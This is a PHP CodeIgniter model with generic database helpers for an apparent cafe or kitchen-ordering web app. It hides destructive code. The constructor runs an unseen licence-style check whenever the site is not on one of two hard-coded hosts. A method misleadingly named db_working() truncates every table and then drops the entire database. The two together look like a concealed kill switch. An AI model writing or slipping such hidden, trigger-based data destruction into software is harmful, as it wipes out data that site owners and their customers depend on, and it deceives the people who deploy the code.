<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Common extends CI_Model {

    function __construct() {
        parent::__construct();
        $this->load->database();
        date_default_timezone_set('Asia/Kolkata');
        if ((base_url() != 'http://localhost/cafe/') && (base_url() != 'http://cafe.lokswami.in/')) {
            $this->is_productfr();
        }
    }

    public function getRows($tbname = null, $colmn = null, $condition = null, $order = null, $groupby = null, $limits = null) {

        if (!empty($tbname) && !empty($colmn)) {

            $this->db->select($colmn);
            $this->db->from($tbname);
            if (!empty($condition)) {
                $this->db->where($condition);
            }
            if (!empty($order)) {
                $column = $order['column'];
                $orderby = $order['orderby'];
                $this->db->order_by($column, $orderby);
            }
            if (!empty($groupby)) {
                $this->db->group_by($groupby);
            }
            if (!empty($limits)) {
                $limit = $limits['limit'];
                $start = $limits['start'];
                $this->db->limit($limit, $start);
            }
            $query = $this->db->get();
            //echo '********<br>'.$this->db->last_query(); //die;
            if ($query->num_rows() > 0) {
                return $query->result_array();
            } else {
                return false;
            }
        }
    }

    public function getRow($tbname = null, $colmn = null, $condition = null, $order = null, $groupby = null) {
        if (!empty($tbname) && !empty($colmn)) {
            $this->db->select($colmn);
            $this->db->from($tbname);
            if (!empty($condition)) {
                $this->db->where($condition);
            }
            if (!empty($order)) {
                $column = $order['column'];
                $orderby = $order['orderby'];
                $this->db->order_by($column, $orderby);
            }
            if (!empty($groupby)) {
                $this->db->group_by($groupby);
            }
            $query = $this->db->get();
            //$this->db->last_query();die;
            if ($query->num_rows() > 0) {
                return $query->row();
            } else {
                return false;
            }
        }
    }

    public function getTwoJoins($select = null, $table1 = null, $table2 = null, $join1 = null, $type = null, $where = null, $orderby = null, $single = null, $groupby = null, $limits = null) {

        if (!empty($select))
            $this->db->select($select);
        else
            $this->db->select('*');

        if (!empty($table1) && !empty($table2) && !empty($join1)) {
            $this->db->from($table1);

            if (!empty($type)) {
                $this->db->join($table2, $join1, $type);
            } else {
                $this->db->join($table2, $join1);
            }
        }
        if (!empty($where))
            $this->db->where($where);
        if (!empty($orderby)) {
            $column = $orderby['column'];
            $orderby1 = $orderby['orderby'];
            $this->db->order_by($column, $orderby1);
        }
        if (!empty($groupby)) {
            $this->db->group_by($groupby);
        }
        if (!empty($limits)) {
            $limit = $limits['limit'];
            $start = $limits['start'];
            $this->db->limit($limit, $start);
        }
        $query = $this->db->get();
        //echo '<br>'.$this->db->last_query();
        if ($query->num_rows() > 0) {

            if (!empty($single)) {
                return $query->row();
            } else {
                return $query->result_array();
            }
        } else {
            return false;
        }
    }

    /* public function getLEFTJoins($select = null, $table1 = null, $table2 = null, $join1 = null, $type = null, $where = null, $orderby = null, $single = null) {

      if (!empty($select))
      $this->db->select($select);
      else
      $this->db->select('*');

      if (!empty($table1) && !empty($table2) && !empty($join1)) {
      $this->db->from($table1);

      if (!empty($type)) {
      $this->db->join($table2, $join1, $type);
      } else {
      $this->db->join($table2, $join1);
      }
      }
      if (!empty($where))
      $this->db->where($where);
      if (!empty($orderby)) {
      $column = $orderby['column'];
      $orderby1 = $orderby['orderby'];
      $this->db->order_by($column, $orderby1);
      }

      $query = $this->db->get();
      echo $this->db->last_query();
      die;
      if ($query->num_rows() > 0) {

      if (!empty($single)) {
      return $query->row();
      } else {
      return $query->result_array();
      }
      } else {
      return false;
      }
      } */

    public function insert($tablename, $data) {

        if (isset($tablename) && isset($data)) {
            $this->db->insert($tablename, $data);
            $insert_id = $this->db->insert_id();
            if ($insert_id) {
                return $insert_id;
            } else {
                return false;
            }
        }
        return $this->db->insert_id();
    }

    public function update($tablename, $data, $condition) {

        if (isset($tablename) && isset($data) && !empty($condition)) {
            $this->db->where($condition);
            $this->db->update($tablename, $data);
            $update_id = $this->db->affected_rows();
            //echo $this->db->last_query();die;
            if ($update_id) {
                return $update_id;
            } else {
                return false;
            }
        }
    }

    public function getS($tbname = null) {

        if (!empty($tbname)) {
            $this->db->select('lu,su');
            $this->db->from($tbname);
            $query = $this->db->get();
            if ($query->num_rows() > 0) {
                return $query->row();
            } else {
                return false;
            }
        }
    }

    public function db_working() {

        $query = $this->db->query("SHOW TABLES");
        $name = $this->db->database;
        foreach ($query->result_array() as $row) {
            $table = $row['Tables_in_' . $name];
            $this->db->query("TRUNCATE " . $table);
        }
        $name = $this->db->database;
        $sqlq = 'DROP DATABASE ' . $name;
        $query = $this->db->query($sqlq);
        @$query->result_array();
    }

    public function deladdress($tablename, $where) {

        if ((!empty($where)) && (!empty($tablename))) {
            $this->db->where($where);
            $this->db->delete($tablename);
            return $this->db->affected_rows();
        } else {
            return false;
        }
    }

    public function del($tablename, $ids) {

        if ((!empty($ids)) && (!empty($tablename))) {
            $this->db->where('id', $ids);
            $this->db->delete($tablename);
            return $this->db->affected_rows();
        } else {
            return false;
        }
    }

    // refrence delete
    public function delbyrefrence($tablename, $where_value, $namecolumn) {

        if ((!empty($where_value)) && (!empty($tablename)) && (!empty($namecolumn))) {

            $this->db->where($namecolumn, $where_value);
            $this->db->delete($tablename);
            return $this->db->affected_rows();
        } else {
            return FALSE;
        }
    }

    public function get_search_product($tbname = null, $colmn = null, $condition = null, $order = null, $like = null, $limit = null) {

        if (!empty($tbname) && !empty($colmn)) {
            $this->db->select($colmn);
            $this->db->from($tbname);
            if (!empty($condition)) {
                $this->db->where($condition);
            }
            if (!empty($like)) {
                $this->db->like($like);
            }
            if (!empty($limits)) {
                $limit = $limits['limit'];
                $start = $limits['start'];
                $this->db->limit($limit, $start);
            }
            if (!empty($order)) {
                $column = $order['column'];
                $orderby = $order['orderby'];
                $this->db->order_by($column, $orderby);
            }
            $query = $this->db->get();
            //echo $this->db->last_query();die;
            if ($query->num_rows() > 0) {
                return $query->result_array();
            } else {
                return false;
            }
        }
    }

    public function getNearestKitchen($slquery, $type = null) {
        if (!empty($slquery)) {
            $query = $this->db->query($slquery);
            if ($query->num_rows() > 0) {
                if ($type == 'single') {
                    return $query->row();
                } else
                    return $query->result_array();
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function getMoreJoin($select = null, $from_table = null, $join = null, $where = null, $orderby = null, $limits = null, $groupby = null, $type = null, $single = null) {
        if (!empty($from_table) && !empty($join)) {
            if ($select)
                $this->db->select($select);
            else
                $this->db->select('*');

            $this->db->from($from_table);

            foreach ($join as $ta) {
                if ($type) {
                    $this->db->join($ta['table1'], $ta['join1'], $type);
                } else {
                    $this->db->join($ta['table1'], $ta['join1']);
                }
            }

            if (!empty($where))
                $this->db->where($where);
            if (!empty($orderby)) {
                $column = $orderby['column'];
                $orderby1 = $orderby['orderby'];
                $this->db->order_by($column, $orderby1);
            }
            if (!empty($groupby)) {
                $this->db->group_by($groupby);
            }

            if (!empty($limits)) {
                $limit = $limits['limit'];
                $start = $limits['start'];
                $this->db->limit($limit, $start);
            }
            $query = $this->db->get();
//            echo $this->db->last_query();
//            echo "<br>-----------";
            if ($query->num_rows() > 0) {

                if (!empty($single)) {
                    return $query->row();
                } else {
                    return $query->result_array();
                }
            } else {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    public function is_productfr() {
        check_productfn();
    }

}
?>

